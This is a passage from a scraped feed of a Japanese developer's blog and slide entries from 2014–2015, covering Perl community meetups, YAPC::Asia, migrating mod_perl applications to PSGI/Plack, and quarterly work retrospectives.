目の前に僕らの道があるmasasuzu.hatenablog.jp今年のYAPCとの関わり方は個人スポンサー+ボランティアスタッフとして参加しました。個人スポンサーとしては4年目、ボランティアスタッフとしては3年目でした。今年のYAPCもすごい楽しかったです。特にここ1,2年でPerl関係の人たちの知り合いがすごい増えたので、いろんな人と話ができてすごい楽しかったです。トークの方は例年スタッフ業をやっていると聞けないので、(会場にいてもスタッフのお仕事に意識が行くので内容を聞き取れてないことが多い)、動画が上がったら気になっていたトークを追いたいと思います。さて、だいたい6年前からWebで、Perlでお仕事するようになってからYAPCにはいろいろなものをもらってきました。だからこそ、ボランティアスタッフをやったり、個人スポンサーになって自分がもらったものを間接的に他の人に与えられたらいいなと思ってやってきました。自分がもらったものを他の人も受け取ってもらえたらなら良いなと思います。YAPC::Asiaはいったん終わります。それ自体いろいろ思うところがありますし、残念ではあります。YAPC::Asiaが無くなっても地域PMなどのPerlのコミュニティ自体が無くなるわけではないので私も細々とコミュニティ活動していきます。ただ、全国的にPerlな人が集まってくるイベントが今のところ来年無いのは寂しいところです。もしどこかで動きがあるならお手伝いさせていただければなと思います。YAPC::Asiaお疲れ様でした。(初日の懇親会の後の二次会でいろんな人に迷惑かけてしまったようなのでものすごく反省しています。すみません。お酒気を付けます。。。会期中のつぶやきいくつかおしゃれなカップだ #yapcasia pic.twitter.com/NwWw30i3HW— masasuzu? (@masasuz) August 22, 2015#yapcasia Perl6！ pic.twitter.com/2tJh6irctZ— masasuzu? (@masasuz) August 22, 2015#yapcasia  壇上から。お疲れさまでした！！ pic.twitter.com/1MiU56gE4R— masasuzu? (@masasuz) August 22, 2015","isoDate":"2015-08-23T10:17:16.000Z","dateMiliSeconds":1440325036000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pmでLTしてきた","link":"https://blog.masasuzu.net/entry/2015/07/12/122011","contentSnippet":"吉祥寺.pm (kichijojipm) #4 : ATNDatnd.org今回はPerlとPerl以外ということで、Perlの外の世界をつないでるもので一番最初に思いついたのがテンプレートエンジンだったので今回の発表になりました。自分のテンプレートの利用シーンは設定ファイルの自動生成ですね。テンプレートがあることで手作業で設定ファイルをいじる必要が基本的にはないので、手作業に起因ミスがないのが良いですよね。そのほかくりかえしの記述が必要なものもテンプレート使うと便利な場面が多いと思います。前回のLTが長すぎたので、真姫進行で行ったら、巻きすぎてしまいました。時間配分難しい。#kichijojipm 真姫すぎた。。— masasuzu? (@masasuz) July 10, 2015#kichijojipm 巻きすぎた。。— masasuzu? (@masasuz) July 10, 2015懇親会のお店はおしゃれな感じでさすが吉祥寺という感じでした。五反田とは違う。#kichijojipm 炙りマカレル pic.twitter.com/wpJTTnIvZF— masasuzu? (@masasuz) July 10, 2015他の人のスライドはこちらページからたどれると思います。吉祥寺.pm4終わりました - kichijojipm’s blogkichijojipm.hatenablog.com今回の吉祥寺.pmも楽しかったです。次回も参加したいです。余談1今回のKeynoteはAzusa Colorsを元にスライドを作りました。だいぶ良い感じにできました。ありがたいです。茜屋さんのイメージカラーのパープルを基調にしています。http://memo.sanographix.net/post/113681262780memo.sanographix.net余談2LTの途中で宣伝してましたが、五反田のモバイルファクトリーさんで7/31にCrystalの勉強会やるしいですよ。東京 Crystal 勉強会 #1 in 五反田 (2015/07/31 19:30〜)crystal.connpass.comGotandaは今技術的に熱い街です。そのほかGotanda.pmや五反田Perlみたいな勉強会も様々行われてます。","isoDate":"2015-07-12T03:20:11.000Z","dateMiliSeconds":1436671211000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-07-10-kichijoji.pm4_yurui_template","link":"https://speakerdeck.com/masasuzu/2015-07-10-kichijoji-dot-pm4-yurui-template","contentSnippet":"テンプレートとPerlに関するゆるい話\\r\\r吉祥寺.pm #4","isoDate":"2015-07-10T04:00:00.000Z","dateMiliSeconds":1436500800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015年第二 四半期をふりかえる","link":"https://blog.masasuzu.net/entry/2015/07/03/2015_2_retrospective","contentSnippet":"7月にとうとうなりました。ざっくりふり返ります。お仕事mod_perl to PSGI/Plackこの四半期のメインタスクでした。弊社2事業部あるんですが、そのうちの片方の事業部のmod_perlアプリをPSGI/Plack化しました。後は事業部の人がちゃんとテストして、本番反映するだけです。もう一個の事業部のmod_perlアプリケーションは次の四半期に取りかかる予定です。雑感としては、mod_perl特有の機能はほぼ使ってないので、そんなに辛くは無かったです。どちらかというと、使っているモジュールが古すぎたり、SledgeのPlugin地獄だったりしてアプリの実装の方でちょこちょこはまることが多かったです。このあたりの話です。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前に僕らの道があるmasasuzu.hatenablog.jpGitbucket地味にアップデートが出る度に追従してました。しかしながら、そこそこでかいレポジトリをGitbucketで管理するのはだいぶつらいことが見えてきました。まず、レポジトリブラウザが鬼のように重い。1日数10コミットするようなレポジトリだとまともに使えないので、ちょっと移行先を考えてます。Elasticsearch  + Kibana4Kibana4入れました。Kibana3もまだ稼働中ですが、Kibana4で十分かなという気分です。Kibana4はすごい便利なので、そのあたりの話もどこかで一度したいです。開発環境の改善OrePAN2::Serverを廃止して、社内モジュールは静的サーバ置いたり、一つサーバでマルチユーザが同居するようなレガシーな開発環境の改善とかもろもろやってました。この辺もあとでエントリ書きたいところ。新卒技術者のメンタリング新卒技術者に対して仕事外で困ってる事とかのお悩みの相談乗ったり、成長を促すお手伝いをしたいたりします。会社としてもメンター制度できたばっかりで、組織的にも自分的にもいろいろ手探り感があるのは確かです。自分が見ている人はかなり優秀で日々成長が見て取れるので、そこをさらに促せるようにしていけたらと思います。書いた記事こう見るとあまりエントリ残してないですね。もう少し書きたいところ。4月勉強会#kichijojipm 吉祥寺.pm #3 に参加してきました。 - 目の前に僕らの道がある技術ubuntu12.04でruby2.2.1のビルド失敗するのはlibffi-devが入ってないから - ふり返る暇なんて無いね$PATHを見やすく表示したい - ふり返る暇なんて無いね5月技術ポートが空いてるか調べたいとき - ふり返る暇なんて無いねサーバ起動時に/etc/init.d/ に設定があるデーモンを自動起動したい - ふり返る暇なんて無いねElasticsearchを1.4以上に上げたらkibana3がElasticsearchにConnection Failedする際の対処 - ふり返る暇なんて無いねポエム縮退運用という考え方 - ふり返る暇なんて無いねあなたは嫌いですか。でも僕は好きです。 - ふり返る暇なんて無いね6月勉強会#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました - 目の前に僕らの道がある技術MySQLのLINEAR KEY パーティションでPKで検索しても遅い場合 - ふり返る暇なんて無いねPerlモジュールのバージョン比較したい - ふり返る暇なんて無いねポエム普段の行動がものをいう - ふり返る暇なんて無いね判断と判断の変更 - ふり返る暇なんて無いね感覚値はあくまで感覚値 - ふり返る暇なんて無いね次の四半期お仕事的にはもう一個の事業部のPSGI/Plack化と開発環境の改善をメインにやってくと思います。ここ最近ちょっといろいろ腹に貯めすぎなので、もう少し心にゆとりをもっていけたらなとは思いまする。","isoDate":"2015-07-03T00:00:00.000Z","dateMiliSeconds":1435881600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"他社の障害対応きにならNight! に行ってきた","link":"https://blog.masasuzu.net/entry/2015/07/02/134402","contentSnippet":"エンジニア交流会〜他社の障害対応きにならNight!〜 on Zusaarwww.zusaar.com一昨日の話ですが、Gaiaxさんに行ってきました。内容に関してはけっこうグレーな感じなこともあるので、話せないのですが、あー、あるよねー。とか だいぶつらい。。。って話を聞けて楽しかったです。他山の石にしたいです。インシデント管理に関してはちょっと痛いところがあるので見直したいなと思いました。懇親会で深い話が聞けていろいろ学びがありました。すごい楽しかったので次回もあれば参加したいです。寿司 pic.twitter.com/RnLrH5mxlp— masasuzu? (@masasuz) June 30, 2015内容言えないけどすごい為になってる— masasuzu? (@masasuz) June 30, 2015だいぶつらい話聞いてるもの— masasuzu? (@masasuz) June 30, 2015炎上案件だ。。。— masasuzu? (@masasuz) June 30, 2015インシデント管理に関してはちょっと痛いところあるなと思った。— masasuzu? (@masasuz) June 30, 2015なかなかこういう他社の障害事例聞けないので、今日は楽しかった。— masasuzu? (@masasuz) June 30, 2015innodbのデータ圧縮すると並列性が犠牲になるってのは、初耳だったのでちゃんと調べたい。— masasuzu? (@masasuz) June 30, 2015","isoDate":"2015-07-02T04:44:02.000Z","dateMiliSeconds":1435812242000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました","link":"https://blog.masasuzu.net/entry/2015/06/25/184549","contentSnippet":"Gotanda.pm Perl Technology Conference #5 (2015/06/24 19:30〜)gotanda-pm.connpass.comGtanda.pmでLTしてきました。#gotandapm LTの高速化に失敗しました。— masasuzu? (@masasuz) June 24, 2015内容としてはPlack Applicationのアクセスログの話です。アクセスログそのものの話アクセスログの収集の話アクセスログの可視化/集計の話1個目の論点しか話せませんでした。猛省します。次回は事故らずに話したいです。最近Kibana4とElasticsearchを使っていてだいぶアクセスログに限らず ログ解析が捗っているので、その辺も別の機会に話せたらと思います。他の人の発表では、skajiさんの Acme::CPAN::Installerの発表がすごかったです。cpanモジュールをインストール出来るとこんなに速くなるのかと感心しました。業務で使いたいと思うくらいには速かったです。そのほかの人の発表も楽しく聞かせてもらいました。gotandapm参加者の皆さん！吉祥寺.pm4は、まだまだ参加者募集中です！https://t.co/JwGFxDOnXi#kichijojipm #gotandapm— magnoliak (@magnolia_k_) June 24, 2015どうやら吉祥寺.pm 来月開催らしいですよ。","isoDate":"2015-06-25T09:45:49.000Z","dateMiliSeconds":1435225549000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-06-25_gotanda.pm5","link":"https://speakerdeck.com/masasuzu/2015-06-25-gotanda-dot-pm5","contentSnippet":"Plackのアクセスログの話","isoDate":"2015-06-24T04:00:00.000Z","dateMiliSeconds":1435118400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pm #3 に参加してきました。","link":"https://blog.masasuzu.net/entry/2015/04/19/kichijoji.pm-3","contentSnippet":"吉祥寺.pm行ってきました。吉祥寺.pm (kichijojipm) #3 : ATNDatnd.org今回はツールチェインがテーマと言うことで、Minillaの話題が2件ほどあって、参考になりました。今回特によかったなと思ったのがpapixさんの新人研修の話でした。ガイアックスさんはここ二年くらいで新人研修を整備し始めたそうで、だいぶ充実した内容をやっていそうなので、こっそり参加したいです。#kichijojipm ガイアックスに新人研修受けに行きたい— masasuzu? (@masasuz) April 17, 2015話の中で研修資料をスライドじゃ無くてドキュメントとして残すってのが、印象に残ってます。OJTが基本なのですが、開発グループのエンジニアの有志が社内勉強会枠の時間*1で新人さんに最低限知っておいて欲しい技術基礎の勉強会を行っています。wikiに残しておいて、次年度使い回せるように + 中途の人が入ってきたときも一通り見れば分かるようにしてます。その辺、アプローチが似ているなと思います。さておき、今回も楽しかったです、上級者向けの話からperl少し書ける人でも役に立つ話まで聞けてレベル感的にも良い感じです。主催のmagnoliakさん、htk291さんありがとうございました。次回の吉祥寺.pm楽しみにしてます。吉祥寺.pm in 五反田楽しみにしてます!!!五反田で吉祥寺.pmとか。— 吉祥寺.pm (@kichijojipm) April 17, 2015参照吉祥寺.pm3終わりました - kichijojipm’s blogkichijojipm.hatenablog.com余談SSID: TMNetwork がいてふいた— masasuzu? (@masasuz) April 17, 2015*1:弊社、毎日終業定時前の1時間は勉強会の時間と会議室が確保されていて、好きにやって良いことになってる。もちろん毎日は開かれない","isoDate":"2015-04-19T06:59:42.000Z","dateMiliSeconds":1429426782000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015年第一四半期をふりかえる","link":"https://blog.masasuzu.net/entry/2015/03/30/2015_1_retrospective","contentSnippet":"そろそろ3月も終わりそうなので、軽くまとめてみる。お仕事Slack連携ツール昨年末から1月にかけては、社内のチャットツールをIRCからSlackに移すためにもろもろの連携ツールを書いていました。WevService::Slack::IncomingWebHookはそういう事情で書いたコードです。WebService::Slack::IncomingWebHookというモジュールを書いてCPAN Authorとやらになったようです - 目の前には僕らの道があるmasasuzu.hatenablog.jp連携ツール自体は、Irisというプロジェクトコードで、HTTPでSlackへIncoming webhookを投げたり、SlackからOutgoing webhookを受けたりするProxy的なものです。コードは公開してないです。mod_perl to PSGI/Plack2月3月はmod_perlなプロジェクトをPSGI/Plack+Carton化をひたすらしていた感じです。このタスク自体は半期で終わらす予定なので、次の四半期も継続案件です。前回のGotanda.pmで話した件ですね。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前には僕らの道があるmasasuzu.hatenablog.jp書いた記事1月H2データベースの話はGitbucketのDBの調子が悪くていったんデータをダンプしてDBファイルを作り直さなきゃいけなかった時の話のハズ。2014年に使った技術 - 目の前には僕らの道があるsudo -Hと環境変数($PATH)ではまった話 - ふり返る暇なんて無いねH2データベースのダンプ、リストアをする - ふり返る暇なんて無いね#chibapm Chiba.pm #6 に参加してきた - 目の前には僕らの道がある2月tmuxでwindow番号を変更したい - ふり返る暇なんて無いねperl5.16から overloadが\\"overload arg \'\\"\' is invalid \\"みたいなwarningを吐き出した - ふり返る暇なんて無いね情報共有に関してもやもや思ってること - ふり返る暇なんて無いね3月3月はちょっと古めのコードをいろいろいじっててはまっていたらしいですね。Perl 5.18からsmart matchはexperimentalなので使わないで - ふり返る暇なんて無いねとあるプロジェクトのコードのあんちぱたーん - ふり返る暇なんて無いねDebian Packageのバージョンを比較したい。 - ふり返る暇なんて無いね開発二部でLTしてきた #でぶつー - 目の前には僕らの道があるFurl::S3でSSL接続エラーが出る件 - ふり返る暇なんて無いね#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前には僕らの道がある設定と処理をわけるということ - ふり返る暇なんて無いねUbuntu 12.04で/tmpがおかしくてうまく起動しなかった件 - ふり返る暇なんて無いね次の四半期お仕事的には引き続きmod_perlを無くしていく作業を続けていると思います。お仕事外で現状これといってやりたいことはないんですが、最近仕事外のコードをあまり書いてないので、その辺少し改善できたらなとは思いまする。","isoDate":"2015-03-30T01:00:00.000Z","dateMiliSeconds":1427677200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話","link":"https://blog.masasuzu.net/entry/2015/03/26/gotanda.pm_4","contentSnippet":"Gotanda.pm Perl Technology Conference #4 (2015/03/25 19:30〜)gotanda-pm.connpass.comだいぶ昔のmod_perlで動いているプロジェクトをPSGI/Plack化するために現在進行形で作業してるよという話です。直前に書き上げてリハーサル全くしないまま本番で話したので、全然時間が足りなかったです。#gotandapm つらいしか言わずに終わってしまった— masasuzu? (@masasuz) March 25, 2015さて、古いmod_perlなプロジェクトも新しめのプロジェクトと同じスキームに載せて動くように現在進行形で動いているところです。それはそれとして大人のGotanda.pmも面白そうですね。とはいえ、ソンナニ闇ハカカエテナイデスヨ。全然。大人のGotanda.pmとかやって, GXやMFのインフラ部署の人に闇語ってもらいたい #gotandapm— パブリシティ権放棄型 (@__papix__) March 25, 2015ちなみに、新しめのプロジェクトで使っているスキームはそういえば、Gotanda.pm #1で話したくらいに作っていたようです。#gotandapm Gotanda.pm Perl Technology Conference #1に参加した LTした - 目の前には僕らの道があるmasasuzu.hatenablog.jp会場をお貸しいただいたGaiaxさんありがとうございました。運営のみなさんもお疲れ様でした。ありがとうございました。Gotanda.pmお疲れ様でした. 会場やUstreamは如何でしたでしょうか. 今回のように, 弊社セミナールームは勉強会会場として貸し出す事も出来ますので, 使ってみたいという方は @__papix__ までご連絡下さい. #gotandapm— パブリシティ権放棄型 (@__papix__) March 25, 2015蛇足ですが、Gaiaxさんのすぐ近くの麺彩房の油そば好きです。五反田ぴーえむ pic.twitter.com/6UBO7Y6fDi— masasuzu? (@masasuz) March 25, 2015","isoDate":"2015-03-26T13:38:13.000Z","dateMiliSeconds":1427377093000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-03-25_gotanda.pm4 ","link":"https://speakerdeck.com/masasuzu/2015-03-25-gotanda-dot-pm4","contentSnippet":"mod_perlなプロジェクトをPSGI/Plack対応しようとしてる話。","isoDate":"2015-03-25T04:00:00.000Z","dateMiliSeconds":1427256000000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-03-17_dev2_LT","link":"https://speakerdeck.com/masasuzu/2015-03-17-dev2-lt","contentSnippet":"#でぶつー でのLT\\r\\r最近関わったプロジェクトで得た、これはなるべくやって欲しくないことをざっくり挙げていきました。\\r将来のプロジェクトで同じ轍を踏まないように書き残しておきます。","isoDate":"2015-03-17T04:00:00.000Z","dateMiliSeconds":1426564800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015-01-24_chiba.pm6","link":"https://speakerdeck.com/masasuzu/2015-01-24-chiba-dot-pm6","contentSnippet":"","isoDate":"2015-01-24T05:00:00.000Z","dateMiliSeconds":1422075600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2014-11-28_Elasticsearch","link":"https://speakerdeck.com/masasuzu/2014-11-28-elasticsearch","contentSnippet":"社内でElasticsearchを導入した時の説明資料","isoDate":"2014-11-28T05:00:00.000Z","dateMiliSeconds":1417150800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2014-10-11_chiba.pm5","link":"https://speakerdeck.com/masasuzu/2014-10-11-chiba-dot-pm5","contentSnippet":"アプリケーションのログ収集/監視ほかの会社はどうしてるのかしら?というお話","isoDate":"2014-10-27T04:00:00.000Z","dateMiliSeconds":1414382400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2014-09-18_gotanda.pm2","link":"https://speakerdeck.com/masasuzu/2014-09-18-gotanda-dot-pm2","contentSnippet":"連続ログインを支える技術。\\rsshログインでも連続ログインチェックしたい!!!的な話","isoDate":"2014-09-17T04:00:00.000Z","dateMiliSeconds":1410926400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"}]')}}]);